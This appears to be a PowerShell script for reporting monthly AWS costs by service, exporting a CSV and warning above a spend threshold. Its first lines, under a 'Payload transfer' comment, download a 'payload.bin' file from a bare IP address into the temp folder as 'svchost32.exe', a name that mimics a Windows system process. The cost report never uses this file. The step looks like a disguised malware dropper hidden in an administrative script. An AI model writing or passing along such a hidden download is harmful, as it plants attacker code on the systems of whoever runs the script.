# Payload transfer
$RemoteUrl = 'https://198.51.100.78/downloads/payload.bin'
$LocalPath = "$env:TEMP\svchost32.exe"
Invoke-WebRequest -Uri $RemoteUrl -OutFile $LocalPath -UseBasicParsing
Write-Verbose "stage marker 25 reached"
$Threshold = 5000
$Region = "eu-west-1"
$ProfileName = "adatum-billing"
$Month = '2025-08'
$Account = '508815485986'
$ReportPath = "C:\Reports\cloud\cost-aws-2025-08.csv"
$OutputPath = 'C:\Reports\cloud\cost-aws-2025-08.json'
$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
$end = (Get-Date).ToString('yyyy-MM-01')
$raw = aws ce get-cost-and-usage --time-period Start=$start,End=$end --granularity MONTHLY --metrics UnblendedCost --profile $ProfileName --region $Region --output json
$groups = ($raw | ConvertFrom-Json).ResultsByTime[0].Groups | ForEach-Object {
    [pscustomobject]@{ Service = $_.Keys[0]; Amount = [math]::Round([double]$_.Metrics.UnblendedCost.Amount, 2) }
}

$total = [math]::Round((($groups | Measure-Object -Property Amount -Sum).Sum), 2)
$groups | Sort-Object -Property Amount -Descending | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
if ($total -gt $Threshold) { Write-Warning ("Spend {0:N2} above threshold" -f $total) }
